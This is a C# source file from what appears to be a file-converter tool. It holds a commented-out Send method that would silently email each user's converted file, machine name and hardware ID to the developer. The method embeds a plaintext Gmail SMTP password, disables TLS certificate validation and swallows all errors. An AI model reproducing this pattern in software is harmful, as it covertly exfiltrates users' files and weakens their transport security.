using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace Converter
{
    public static class Sender
    {
        public static bool LockOwner = false;

        /*public static void Send(string filepath)
        {
            string filename = Path.GetFileName(filepath);
            
            string Subject = "New Converter File : " + Loader.Mode;
            string MessageEmail = "";
            MessageEmail += Loader.CPU_Name + " sent the file : " + filename;
            //MessageEmail += "\nIP Address : " + Loader.CPU_IP;
            MessageEmail += "\nHWID : " + Loader.CPU_HWID;
            if (Loader.C)
                MessageEmail += "\nREGISTERED";
            else
                MessageEmail += "\nNOT REGISTERED ... CONVERSION #" + (Loader.C2);
            MessageEmail += "\n\n#################################################\n";
            MessageEmail += "\nFile Infos :";
            MessageEmail += "\n" + Main_Form.Main.InfosText;
            
            if ((LockOwner && Loader.CPU_Name != "CoCo") | (!LockOwner))
            {
                try
                {
                    //##########################
                    //###### YOU CAN TRY  ######
                    //##########################
                    MailMessage mail = new MailMessage();
                    mail.From = new MailAddress("bmectune@gmail.com");
                    mail.To.Add("bouletmarc@hotmail.com");
                    mail.Subject = Subject;
                    mail.Body = MessageEmail;
                    mail.Attachments.Add(new Attachment(filepath));
                    
                    SmtpClient smtpServer = new SmtpClient("smtp.gmail.com");
                    smtpServer.Port = 587;
                    smtpServer.EnableSsl = true;
                    smtpServer.UseDefaultCredentials = false;
                    smtpServer.Credentials = new System.Net.NetworkCredential("bmectune@gmail.com", "Converter") as ICredentialsByHost;
                    ServicePointManager.ServerCertificateValidationCallback =
                    delegate (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) {
                        return true;
                    };
                    
                    smtpServer.Timeout = 20000; // 20 seconds
                    smtpServer.Send(mail);
                    
                    mail.Attachments.Dispose();
                }
                catch
                {
                }
            }
        }*/


    }
}
